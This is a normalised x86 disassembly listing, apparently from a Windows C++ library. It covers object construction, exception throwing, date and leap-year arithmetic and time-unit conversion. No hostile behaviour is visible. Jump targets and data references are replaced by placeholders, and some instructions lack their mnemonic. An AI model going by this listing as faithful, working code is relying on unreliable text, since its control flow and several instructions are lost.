call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
add esi 0xffffffc4
push esi
call sub_1000a34a
jmp r-xdata
xor eax eax
add eax 0x3c
jmp r-xdata
test eax eax
je r-xdata
call sub_1002b37e
retn
sub_1000a39b
push 0x4
mov eax sub_1004ff23
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_1000a3e2
xor eax eax
mov [ ebp - 0x4 ] eax
cmp edi eax
je r-xdata
lea edi [ esi + 0x28 ]
push eax
mov ecx edi
call sub_1000ae26
mov [ esi ] r--data
mov [ edi ] r--data
mov eax esi
call sub_1002b37e
retn 0x4
lea eax [ edi + 0x28 ]
sub_1000a405
push 0xc4
mov eax sub_1005145c
call sub_1002b2a6
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
push eax
lea ecx [ ebp - 0x38 ]
call sub_1000a72f
xor esi esi
push 0x0
inc esi
push esi
lea ecx [ ebp - 0x54 ]
call sub_100020e2
mov [ ebp - 0x38 ] r--data
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x4 ] esi
push eax
lea esi [ ebp - 0xd0 ]
call sub_1000a243
pop ecx
lea ecx [ ebp - 0x94 ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x2
call sub_1000a1e9
lea eax [ ebp - 0x94 ]
mov [ esp ] r--data
push eax
call sub_1002ae74
int3
sub_1000a47c
push 0x44
mov eax sub_10050a0f
call sub_1002b2a6
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
push eax
lea ecx [ ebp - 0x50 ]
call sub_1000a72f
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
mov [ ebp - 0x50 ] r--data
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000a6ef
sub_1000a4c6
push 0x4
mov eax sub_10050490
call sub_1002b2a6
mov edi ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
push edi
mov ecx esi
call sub_1000a678
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x3c ] r--data
mov [ ebp - 0x4 ] 0x1
lea ebx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ebx ] r--data
mov [ esi + 0x3c ] r--data
test edi edi
je r-xdata
xor edi edi
add edi 0x28
jmp r-xdata
call sub_1000ab7f
mov eax esi
call sub_1002b37e
retn
sub_1000a520
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_1000a6bf
mov [ esi + 0x28 ] r--data
and [ esi + 0x2c ] 0x0
and [ esi + 0x30 ] 0x0
and [ esi + 0x34 ] 0x0
or [ esi + 0x38 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov eax esi
leave
retn
sub_1000a5a1
push 0x4
mov eax sub_100518f0
call sub_1002b2a6
mov esi ecx
push 0x40
call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
add esi 0xffffffc4
push esi
call sub_1000a627
jmp r-xdata
xor eax eax
add eax 0x3c
jmp r-xdata
test eax eax
je r-xdata
call sub_1002b37e
retn
sub_1000a678
push 0x4
mov eax sub_1004ff23
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_1000a6bf
xor eax eax
mov [ ebp - 0x4 ] eax
cmp edi eax
je r-xdata
lea edi [ esi + 0x28 ]
push eax
mov ecx edi
call sub_1000ae26
mov [ esi ] r--data
mov [ edi ] r--data
mov eax esi
call sub_1002b37e
retn 0x4
lea eax [ edi + 0x28 ]
sub_1000a6ef
push 0x80
mov eax sub_100509e1
call sub_1002b2a6
push [ ebp + 0x8 ]
lea esi [ ebp - 0x4c ]
call sub_1000a520
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x8c ]
push ecx
mov ecx eax
call sub_1000a4c6
pop ecx
pop ecx
push r--data
lea eax [ ebp - 0x8c ]
push eax
call sub_1002ae74
int3
sub_1000a769
push 0x44
mov eax sub_10051426
call sub_1002b2a6
movzx esi [ ebp + 0x10 ]
push 0xe
pop eax
sub eax esi
cdq
push 0xc
pop ecx
idiv ecx
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
push 0x5
pop edi
mov ebx 0x190
push 0x64
movzx eax ax
sub ecx eax
imul eax eax 0xc
lea eax [ eax + edx - 0x3 ]
movzx eax ax
movzx eax ax
imul eax eax 0x99
add ecx 0x12c0
inc eax
inc eax
cdq
idiv edi
movzx ecx cx
movzx ecx cx
mov edi eax
mov eax ecx
cdq
idiv ebx
pop ebx
push 0x2
add edi eax
mov eax ecx
cdq
idiv ebx
sub edi eax
mov eax ecx
imul eax eax 0x16d
add edi eax
movzx eax [ ebp + 0x14 ]
shr ecx 0x2
add edi ecx
mov ecx [ ebp + 0x8 ]
lea eax [ edi + eax - 0x7d2d ]
mov [ ecx ] eax
pop eax
sub esi eax
je r-xdata
movzx esi [ ebp + 0xc ]
mov eax esi
and eax 0x80000003
jns r-xdata
sub esi eax
je r-xdata
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
push 0x1e
jmp r-xdata
sub esi eax
je r-xdata
push 0x1c
mov eax esi
push 0x64
cdq
pop edi
idiv edi
test edx edx
jne r-xdata
pop eax
cmp ax [ ebp + 0x14 ]
jae r-xdata
sub esi 0x3
je r-xdata
mov eax ecx
call sub_1002b37e
retn 0x10
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
push eax
lea ecx [ ebp - 0x50 ]
call sub_1000a72f
mov [ ebp - 0x50 ] r--data
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000a6ef
push 0x1d
jmp r-xdata
mov eax esi
cdq
mov esi 0x190
idiv esi
test edx edx
jne r-xdata
sub esi eax
je r-xdata
push 0x1f
jmp r-xdata
sub_1000a880
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx ecx
xor ecx ecx
cmp eax ecx
push edi
mov edi [ ebp + 0xc ]
jl r-xdata
neg eax
cmp ebx ecx
jl r-xdata
cmp [ ebp + 0x8 ] ecx
jge r-xdata
neg ebx
cmp [ ebp + 0x8 ] ecx
jl r-xdata
cmp esi ecx
jg r-xdata
neg [ ebp + 0x8 ]
cmp ebx ecx
jge r-xdata
cmp esi ecx
jl r-xdata
push ecx
cdq
push 0x3c
push edx
push eax
call sub_1002e310
mov ecx eax
mov eax edx
mov [ ebp - 0x4 ] eax
mov eax ebx
cdq
add ecx eax
mov eax [ ebp - 0x4 ]
push 0x0
push 0x3c
adc eax edx
push eax
push ecx
call sub_1002e310
mov ecx eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cdq
push 0x0
add ecx eax
push 0xf4240
adc ebx edx
push ebx
push ecx
call sub_1002e310
neg edi
adc esi 0x0
neg esi
sub edi eax
sbb esi edx
mov eax edi
mov edx esi
jl r-xdata
jg r-xdata
neg edi
adc esi ecx
neg esi
cmp edi ecx
jae r-xdata
push ecx
cdq
push 0x3c
push edx
push eax
call sub_1002e310
mov ecx eax
mov eax edx
mov [ ebp - 0x4 ] eax
mov eax ebx
cdq
add ecx eax
mov eax [ ebp - 0x4 ]
push 0x0
push 0x3c
adc eax edx
push eax
push ecx
call sub_1002e310
mov ecx eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cdq
push 0x0
add ecx eax
push 0xf4240
adc ebx edx
push ebx
push ecx
call sub_1002e310
add eax edi
adc edx esi
jmp r-xdata
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1000a964
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ebx
call sub_1000ab39
test al al
jne r-xdata
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
push 0xfffffffe
pop esi
mov ecx 0x7fffffff
cmp eax esi
jne r-xdata
mov esi [ ebp + 0x8 ]
call sub_1000ab39
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp edx esi
jne r-xdata
cmp edx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebx ]
sub ecx [ eax ]
mov edx [ ebx + 0x4 ]
sbb edx [ eax + 0x4 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] edx
jmp r-xdata
push [ ebx + 0x4 ]
push [ ebx ]
call sub_1000aa6d
pop ecx
pop ecx
test al al
je r-xdata
cmp eax ecx
je r-xdata
mov [ edi + 0x4 ] ecx
mov eax edi
pop esi
leave
retn 0x4
mov eax [ ebx ]
mov esi 0x80000000
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_1000aa6d
pop ecx
pop ecx
test al al
jne r-xdata
mov eax ebx
call sub_1000ab16
test al al
je r-xdata
cmp [ ebx + 0x4 ] esi
jne r-xdata
mov [ edi + 0x4 ] 0x7fffffff
jmp r-xdata
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
call sub_1000aa6d
pop ecx
pop ecx
test al al
je r-xdata
mov eax [ ebx ]
mov [ edi ] eax
mov eax [ ebx + 0x4 ]
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi ] esi
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
and [ edi ] 0x0
mov [ edi + 0x4 ] esi
jmp r-xdata
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ eax + 0x4 ] esi
jne r-xdata
push 0xfffffffe
pop esi
or [ edi ] 0xffffffff
mov [ edi + 0x4 ] 0x7fffffff
jmp r-xdata
sub_1000aa85
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0xfffffffe
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x7fffffff
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000aa6d
movzx eax al
neg eax
sbb eax eax
pop ecx
and eax 0xfffffffd
pop ecx
add eax 0x5
pop ebp
retn
cmp [ ebp + 0xc ] 0x80000000
jne r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_1000aacb
sub ecx 0x0
je r-xdata
mov [ eax + 0x4 ] 0x7fffffff
dec ecx
je r-xdata
and [ eax ] 0x0
dec ecx
je r-xdata
or [ eax ] 0xffffffff
mov [ eax + 0x4 ] 0x7fffffff
retn
dec ecx
je r-xdata
mov [ eax ] 0x1
jmp r-xdata
dec ecx
mov [ eax + 0x4 ] 0x7fffffff
jne r-xdata
mov [ eax + 0x4 ] 0x80000000
retn
mov [ eax ] 0xfffffffe
retn
mov [ eax ] 0xfffffffd
retn
sub_1000ab16
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
test ecx ecx
jne r-xdata
cmp ecx 0xffffffff
jne r-xdata
cmp eax 0x80000000
je r-xdata
xor eax eax
retn
cmp eax 0x7fffffff
je r-xdata
xor eax eax
inc eax
retn
sub_1000ab39
mov eax esi
call sub_1000ab16
test al al
jne r-xdata
xor eax eax
inc eax
retn
cmp [ esi ] 0xfffffffe
jne r-xdata
xor eax eax
retn
cmp [ esi + 0x4 ] 0x7fffffff
je r-xdata
sub_1000ab59
mov ecx [ esi ]
push edi
mov edi [ eax ]
test ecx ecx
je r-xdata
mov [ esi ] edi
test edi edi
je r-xdata
mov eax [ ecx ]
call [ eax + 0x10 ]
test al al
je r-xdata
mov eax esi
pop edi
retn
mov eax [ edi ]
mov ecx edi
call [ eax + 0xc ]
and [ esi ] 0x0
sub_1000ab7f
push 0x8
mov eax sub_1004fb34
call sub_1002b2a6
and [ ebp - 0x10 ] 0x0
and [ ebp - 0x4 ] 0x0
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
mov eax [ edi + 0x10 ]
mov [ ebx + 0x10 ] eax
mov eax [ edi + 0x8 ]
mov [ ebx + 0x8 ] eax
lea esi [ ebx + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_1000ab59
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
lea edx [ ebp - 0x14 ]
push edx
call [ eax + 0x14 ]
lea esi [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000ab59
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
call sub_1002b37e
retn
mov eax [ ecx ]
call [ eax + 0x10 ]
mov eax [ ecx ]
call [ eax + 0x10 ]
test al al
je r-xdata
and [ ebp - 0x14 ] 0x0
sub_1000abfa
push 0x4
mov eax sub_10050462
call sub_1002b2a6
mov edi ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
push edi
mov ecx esi
call sub_1000adcc
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x3c ] r--data
mov [ ebp - 0x4 ] 0x1
lea ebx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ebx ] r--data
mov [ esi + 0x3c ] r--data
test edi edi
je r-xdata
xor edi edi
add edi 0x28
jmp r-xdata
call sub_1000ab7f
mov eax esi
call sub_1002b37e
retn
sub_1000ac54
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_10001db8
mov [ esi + 0x28 ] r--data
and [ esi + 0x2c ] 0x0
and [ esi + 0x30 ] 0x0
and [ esi + 0x34 ] 0x0
or [ esi + 0x38 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov eax esi
leave
retn
sub_1000acd6
push 0x4
mov eax sub_100518f0
call sub_1002b2a6
mov esi ecx
push 0x40
call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
add esi 0xffffffc4
push esi
call sub_1000ad5c
jmp r-xdata
xor eax eax
add eax 0x3c
jmp r-xdata
test eax eax
je r-xdata
call sub_1002b37e
retn
sub_1000ad89
push esi
mov esi ecx
mov [ esi ] r--data
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
pop esi
retn
mov eax [ ecx ]
call [ eax + 0x10 ]
test al al
je r-xdata
and [ esi + 0x4 ] 0x0
sub_1000adcc
push 0x4
mov eax sub_1004ff00
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_10001db8
xor eax eax
mov [ ebp - 0x4 ] eax
cmp edi eax
je r-xdata
lea edi [ esi + 0x28 ]
push eax
mov ecx edi
call sub_1000ae26
mov [ esi ] r--data
mov [ edi ] r--data
mov eax esi
call sub_1002b37e
retn 0x4
lea eax [ edi + 0x28 ]
sub_1000ae26
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
mov [ esi ] r--data
mov ecx [ edi + 0x4 ]
mov [ esi + 0x4 ] ecx
test ecx ecx
je r-xdata
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
pop edi
mov eax esi
pop esi
retn 0x4
mov eax [ ecx ]
call [ eax + 0xc ]
sub_1000ae84
push 0x80
mov eax sub_100509bb
call sub_1002b2a6
push [ ebp + 0x8 ]
lea esi [ ebp - 0x4c ]
call sub_1000ac54
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x8c ]
push ecx
mov ecx eax
call sub_1000abfa
pop ecx
pop ecx
push r--data
lea eax [ ebp - 0x8c ]
push eax
call sub_1002ae74
int3
sub_1000aec4
push 0x44
mov eax sub_100513fb
call sub_1002b2a6
push [ ebp + 0x8 ]
call sub_1002959f
pop ecx
test eax eax
jne r-xdata
call sub_1002b37e
retn
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_10001eec
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000ae84
sub_1000af0a
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
pop esi
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov ecx esi
pop esi
jmp [ eax + 0x8 ]
sub_1000af7e
push 0x48
mov eax sub_100513c6
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0xc ]
push 0xf
pop esi
mov [ ebp - 0x50 ] eax
mov eax [ ebp + 0x10 ]
mov edi ecx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x30 ] esi
call sub_100021a7
mov [ ebp - 0x4 ] ebx
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] esi
call sub_100021a7
mov esi [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
add esi 0x3c
push esi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_100102b2
mov eax [ edi ]
pop ecx
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ ebp - 0x48 ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100020e2
call sub_1002b392
retn 0xc
mov ecx [ ebp - 0x4c ]
push esi
lea edi [ ebp - 0x2c ]
call sub_100103cd
pop ecx
sub_1000b014
push 0x4c
mov eax sub_10052676
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0xc ]
xor edi edi
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x14 ] 0xf
call sub_100021a7
mov ecx [ ebp - 0x30 ]
lea eax [ ebp - 0x2c ]
push eax
push [ ebp - 0x34 ]
mov [ ebp - 0x4 ] edi
push esi
call sub_1000af7e
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001362
lea eax [ ebp - 0x2c ]
push eax
lea eax [ esi + 0x4 ]
push eax
push esi
lea edx [ ebp - 0x54 ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x1
call sub_1000b400
push edi
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_1000264e
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
mov eax ebx
call sub_1002b392
retn 0x8
sub_1000b098
push 0x88
mov eax sub_10051d30
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0xc ]
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x50 ] eax
mov eax [ ebp + 0x10 ]
push r--data
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x5c ] edi
call sub_10001362
xor esi esi
lea eax [ ebp - 0x2c ]
inc esi
push eax
lea ebx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] esi
call sub_10015bc4
pop ecx
push edi
push esi
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
call sub_1000264e
lea ecx [ ebp - 0x2c ]
lea ebx [ ebp - 0x94 ]
call sub_10015d8f
push r--data
push eax
mov [ ebp - 0x4 ] 0x4
push [ ebp - 0x50 ]
call sub_100098f3
add esp 0xc
push edi
push esi
mov ecx ebx
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x4 ] 0x3
call sub_1000264e
push [ ebp - 0x50 ]
lea eax [ ebp - 0x4c ]
push eax
call sub_100107d3
push edi
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x60 ] 0xf
call sub_100021a7
lea eax [ ebp - 0x78 ]
push eax
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x4c ]
push [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x6
call sub_1000af7e
push edi
push esi
lea ecx [ ebp - 0x78 ]
call sub_100020e2
lea ecx [ ebp - 0x4c ]
call sub_1001081d
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_1000264e
mov eax [ ebp - 0x50 ]
call sub_1002b392
retn 0xc
sub_1000b17a
push ebp
sub esp 0xac
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xac ] eax
push 0x74
mov eax sub_1005263b
call sub_1002b2d9
mov eax [ ebp + 0xb8 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0xbc ]
xor esi esi
mov [ ebp - 0x4 ] esi
push eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x28 ] esi
call sub_10002f1b
mov [ ebp - 0x4 ] esi
inc esi
push r--data
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x28 ] esi
call sub_10001362
lea eax [ ebp + 0x20 ]
push eax
lea ebx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] esi
call sub_10015bc4
pop ecx
xor edi edi
push edi
push esi
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
call sub_1000264e
push edi
lea eax [ ebp + 0x20 ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_1000c5a1
lea eax [ ebp - 0x64 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x4
call sub_1000d425
push edi
push esi
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x6
call sub_1000264e
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x18 ]
cmp ecx edi
je r-xdata
push [ ebp - 0x1c ]
lea eax [ ebp + 0x3c ]
push eax
call sub_1000c5d8
lea eax [ ebp + 0x3c ]
push eax
lea ecx [ ebp + 0x90 ]
mov [ ebp - 0x4 ] 0x7
call sub_100025cf
push r--data
lea ecx [ ebp + 0x74 ]
mov [ ebp - 0x4 ] 0x8
call sub_10001362
mov [ ebp - 0x4 ] 0x9
mov eax [ ebp + 0xa4 ]
push [ ebp + 0x88 ]
sub eax [ ebp + 0x88 ]
lea ecx [ ebp + 0x90 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call sub_10009533
mov ecx eax
lea eax [ ebp + 0x74 ]
mov [ ebp - 0x4 ] 0xa
call sub_10006e2c
mov bl al
neg bl
push edi
sbb bl bl
push esi
lea ecx [ ebp - 0x48 ]
inc bl
call sub_1000264e
test bl bl
jne r-xdata
push edi
push esi
lea ecx [ ebp + 0x20 ]
call sub_1000264e
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0xac ]
xor ecx ebp
call sub_10027150
add ebp 0xb0
leave
retn 0x8
call sub_1000af0a
push edi
push esi
lea ecx [ ebp + 0x74 ]
call sub_1000264e
push edi
push esi
lea ecx [ ebp + 0x90 ]
call sub_1000264e
push edi
push esi
lea ecx [ ebp + 0x3c ]
mov [ ebp - 0x4 ] 0x6
call sub_1000264e
lea eax [ ebp - 0x1c ]
push edi
push eax
call sub_100241e0
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp + 0x90 ]
push eax
lea eax [ ebp ]
push eax
mov [ ebp - 0x4 ] 0xb
call sub_100107d3
push edi
lea ecx [ ebp + 0x58 ]
mov [ ebp + 0x70 ] 0xf
call sub_100021a7
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xd
call sub_10001ebc
mov ebx [ ebp - 0x2c ]
lea eax [ ebp + 0x58 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push ebx
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0xe
call sub_1000af7e
push edi
push esi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xd
call sub_100020e2
lea eax [ ebp + 0x58 ]
push eax
lea eax [ ebx + 0x4 ]
push eax
push ebx
lea edx [ ebp + 0x90 ]
lea ecx [ ebp - 0x24 ]
call sub_1000b400
mov [ ebp - 0x4 ] 0xf
cmp [ ebp - 0x24 ] edi
je r-xdata
cmp [ ebp - 0x1c ] edi
setne al
test al al
je r-xdata
mov [ ebp - 0x4 ] 0xd
mov ecx [ ebp - 0x20 ]
cmp ecx edi
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x14 ]
call sub_1000b923
push edi
push esi
lea ecx [ ebp + 0x58 ]
call sub_100020e2
lea ecx [ ebp ]
call sub_1001081d
mov [ ebp - 0x4 ] 0x9
jmp r-xdata
call sub_1000af0a
sub_1000b400
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10052591
mov eax [ fs : 0x0 ]
push eax
sub esp 0x140
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x138 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x150 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov [ esp + 0x24 ] eax
mov eax [ ebp + 0xc ]
xor ebx ebx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x20 ] eax
mov eax [ esi + 0x14 ]
xor edi edi
mov [ esp + 0x1c ] ecx
mov [ esp + 0x18 ] ebx
cmp eax 0x4
jbe r-xdata
mov [ ecx ] edi
push edi
add ecx 0x4
call sub_1000c69d
push edi
push edi
push [ esp + 0x24 ]
call sub_1000d3de
mov eax [ esp + 0x28 ]
add esp 0xc
mov ecx [ esp + 0x150 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x138 ]
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn 0xc
push edx
lea ecx [ esp + 0x114 ]
call sub_100025cf
mov edi r--data
push edi
lea ecx [ esp + 0x114 ]
mov [ esp + 0x15c ] ebx
call sub_1000c634
test eax eax
jne r-xdata
lea eax [ esp + 0x6c ]
push eax
mov ecx esi
call sub_1000b98b
push 0x4
lea eax [ esp + 0x1c ]
push eax
lea eax [ esp + 0x74 ]
push eax
mov [ esp + 0x164 ] 0x2
call sub_1000bf77
cmp [ esp + 0x18 ] 0x5
mov [ esp + 0x13 ] 0x1
jb r-xdata
push esi
lea eax [ esp + 0x2c ]
push eax
push [ esp + 0x2c ]
call sub_1000b098
push 0xffffffff
push ebx
push eax
lea ecx [ esp + 0x11c ]
mov [ esp + 0x164 ] 0x1
call sub_1000253c
push ebx
push 0x1
lea ecx [ esp + 0x30 ]
mov [ esp + 0x160 ] bl
call sub_1000264e
push 0xffffffff
push [ esp + 0x1c ]
push esi
lea esi [ esp + 0x138 ]
call sub_1000b8f5
push 0x4
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x74 ]
mov [ esp + 0x160 ] 0x3
push eax
mov [ esp + 0x20 ] ebx
call sub_1000bf77
push ebx
push [ esp + 0x18 ]
lea ecx [ esp + 0xfc ]
call sub_10005cd0
push 0x10
mov [ esp + 0x15c ] 0x4
mov eax [ esp + 0xfc ]
pop esi
cmp [ esp + 0x10c ] esi
jae r-xdata
push 0x1
lea eax [ esp + 0x17 ]
push eax
lea eax [ esp + 0x74 ]
push eax
call sub_1000bf77
cmp [ esp + 0x13 ] bl
jne r-xdata
push [ esp + 0x14 ]
push eax
lea eax [ esp + 0x74 ]
push eax
call sub_1000bf77
mov edi [ esp + 0xf8 ]
cmp [ esp + 0x10c ] esi
jae r-xdata
lea eax [ esp + 0xf8 ]
push edi
lea ecx [ esp + 0x114 ]
call sub_100014f8
mov edx [ esp + 0x130 ]
cmp [ esp + 0x144 ] esi
jae r-xdata
lea edi [ esp + 0xf8 ]
mov eax [ esp + 0x20 ]
cmp [ eax + 0xa0 ] esi
jb r-xdata
lea edx [ esp + 0x130 ]
lea ecx [ eax + 0x8c ]
mov ecx [ eax + 0x8c ]
jmp r-xdata
push 0x5c
call sub_1002738b
pop ecx
mov [ esp + 0x20 ] eax
mov [ esp + 0x158 ] 0x6
cmp eax ebx
je r-xdata
push r--data
lea ecx [ esp + 0x2c ]
call sub_10001ebc
lea eax [ esp + 0x28 ]
push eax
lea ecx [ esp + 0x48 ]
mov [ esp + 0x15c ] 0x5
call sub_10001eec
push r--data
lea eax [ esp + 0x48 ]
push eax
call sub_1002ae74
push edi
push edx
call sub_100205ee
cmp eax 0x1
sete al
pop ecx
pop ecx
cmp al 0x1
je r-xdata
xor eax eax
lea ecx [ esp + 0x110 ]
push ecx
lea ecx [ esp + 0x130 ]
push ecx
push eax
call sub_10010a91
jmp r-xdata
push ebx
push 0x1
lea ecx [ esp + 0xfc ]
mov edi eax
call sub_100020e2
push ebx
push 0x1
lea ecx [ esp + 0x134 ]
call sub_100020e2
lea eax [ esp + 0x6c ]
mov [ esp + 0x158 ] bl
call sub_1000b6e6
